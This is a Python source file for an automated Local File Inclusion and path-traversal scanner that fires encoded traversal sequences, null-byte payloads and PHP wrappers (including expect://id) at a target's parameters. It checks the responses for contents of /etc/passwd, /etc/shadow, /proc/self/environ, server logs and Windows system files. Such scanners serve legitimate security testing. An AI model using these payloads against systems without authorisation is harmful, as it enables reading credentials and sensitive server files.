"""LFI/Path Traversal — Local File Inclusion vulnerability scanner.

Local File Inclusion allows attackers to read arbitrary files on the server
by manipulating path parameters. Can lead to credential theft, source code
disclosure, and RCE via log poisoning.

Tests: classic traversal, encoded traversal, null byte injection,
       Linux/Windows target files, filter bypass techniques.
"""

from __future__ import annotations

import asyncio
import re
from typing import Any
from urllib.parse import urlparse, parse_qs

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# Target files that confirm LFI (detection patterns)
_LFI_TARGETS: list[tuple[str, str, str]] = [
    # (payload_suffix, detection_pattern, file_desc)
    # Linux
    ("/etc/passwd", r"root:x:0:0:|daemon:|bin:|sys:", "passwd"),
    ("/etc/hosts", r"127\.0\.0\.1\s+localhost|::1\s+localhost", "hosts"),
    ("/etc/shadow", r"root:\$", "shadow"),
    ("/proc/self/environ", r"(?i)PATH=|HOME=|USER=|SHELL=", "environ"),
    ("/proc/version", r"Linux version|gcc version", "proc_version"),
    ("/var/log/apache2/access.log", r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", "apache_log"),
    ("/var/log/nginx/access.log", r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", "nginx_log"),
    ("/etc/nginx/nginx.conf", r"worker_processes|server_name|listen\s+\d+", "nginx_conf"),
    ("/etc/apache2/apache2.conf", r"ServerName|DocumentRoot|Listen\s+\d+", "apache_conf"),
    # Windows
    ("C:\\Windows\\System32\\drivers\\etc\\hosts", r"127\.0\.0\.1\s+localhost", "win_hosts"),
    ("C:\\Windows\\win.ini", r"\[fonts\]|\[extensions\]|for 16-bit app", "win_ini"),
    ("C:\\boot.ini", r"\[boot loader\]|\[operating systems\]", "boot_ini"),
]

# Path traversal sequences to test
_TRAVERSAL_SEQUENCES: list[str] = [
    "../",
    "..%2F",           # URL encoded /
    "..%252F",         # Double URL encoded
    "..%c0%af",        # UTF-8 overlong
    "..%c1%9c",        # UTF-8 overlong variant
    "..\\",            # Windows backslash
    "..%5C",           # URL encoded \
    "....//",          # Double dot + double slash
    "%2e%2e%2f",       # Fully encoded ../
    "%2e%2e/",         # Partially encoded
    "..%2f",           # Mixed case
    "/%2e%2e",
]

# How many traversal depths to try
_DEPTHS = [3, 5, 7, 9]

# Parameters commonly used for file inclusion
_LFI_PARAMS: list[str] = [
    "file", "page", "include", "require", "path", "dir",
    "template", "view", "content", "module", "section",
    "document", "doc", "load", "read", "display", "show",
    "lang", "language", "locale", "i18n",
    "filename", "filepath", "source", "src",
    "cat", "action", "func", "function",
]

# PHP wrappers for advanced LFI
_PHP_WRAPPERS: list[tuple[str, str]] = [
    ("php://filter/read=convert.base64-encode/resource=/etc/passwd", "php_filter"),
    ("php://input", "php_input"),
    ("data://text/plain;base64,cm9vdDp4OjA6MDo6L3Jvb3Q6L2Jpbi9iYXNo", "data_uri"),
    ("expect://id", "expect_wrapper"),
]


class LFIScanner(BaseOsintScanner):
    """Local File Inclusion and Path Traversal vulnerability scanner.

    Tests parameters for LFI vulnerabilities using:
    - Classic ../../../etc/passwd traversal
    - URL-encoded and double-encoded variants
    - PHP wrapper techniques (filter, input, data://)
    - Null byte injection (%00)
    - Windows-specific traversal paths
    """

    scanner_name = "lfi"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL})
    cache_ttl = 1800
    scan_timeout = 90

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        vulnerabilities: list[dict[str, Any]] = []
        identifiers: list[str] = []

        parsed = urlparse(base_url)
        existing_params = list(parse_qs(parsed.query).keys())
        base_clean = base_url.split("?")[0]
        test_params = list(dict.fromkeys(existing_params + _LFI_PARAMS[:8]))

        async with httpx.AsyncClient(
            timeout=8,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; LFIScanner/1.0)"},
        ) as client:
            semaphore = asyncio.Semaphore(8)

            async def test_lfi(param: str, payload: str, description: str, detection: str) -> None:
                async with semaphore:
                    for method in ("GET", "POST"):
                        try:
                            if method == "GET":
                                resp = await client.get(f"{base_clean}?{param}={payload}")
                            else:
                                resp = await client.post(base_clean, data={param: payload})

                            if resp.status_code == 200 and re.search(detection, resp.text):
                                vuln = {
                                    "parameter": param,
                                    "payload": payload,
                                    "method": method,
                                    "file_read": description,
                                    "severity": "critical",
                                    "evidence": re.search(detection, resp.text).group(0)[:80] if re.search(detection, resp.text) else "",
                                    "description": f"LFI: server returned contents of '{description}'",
                                }
                                vulnerabilities.append(vuln)
                                ident = f"vuln:lfi:{param}"
                                if ident not in identifiers:
                                    identifiers.append(ident)
                                return  # Confirmed — stop
                        except Exception:
                            pass

            # Build all test cases
            tasks = []
            for param in test_params:
                for target_suffix, detection, file_desc in _LFI_TARGETS:
                    # Test with each traversal sequence at each depth
                    for traversal in _TRAVERSAL_SEQUENCES[:6]:  # Top 6 sequences
                        for depth in _DEPTHS[:3]:  # 3, 5, 7 levels
                            prefix = traversal * depth
                            payload = f"{prefix}{target_suffix}"
                            tasks.append(test_lfi(param, payload, file_desc, detection))
                            # Null byte termination
                            tasks.append(test_lfi(param, f"{payload}%00", f"{file_desc}+nullbyte", detection))

                # PHP wrapper tests
                for wrapper, wrapper_desc in _PHP_WRAPPERS:
                    tasks.append(test_lfi(param, wrapper, f"php_wrapper:{wrapper_desc}", r"root|cm9vd|uid="))

            await asyncio.gather(*tasks)

        # Deduplicate by parameter (keep highest-confidence per param)
        seen_params: dict[str, dict] = {}
        for v in vulnerabilities:
            p = v["parameter"]
            if p not in seen_params:
                seen_params[p] = v
        unique_vulns = list(seen_params.values())

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "vulnerabilities": unique_vulns,
            "raw_vulnerability_count": len(vulnerabilities),
            "total_unique_params": len(unique_vulns),
            "files_read": list({v.get("file_read", "") for v in unique_vulns}),
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type == ScanInputType.DOMAIN:
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
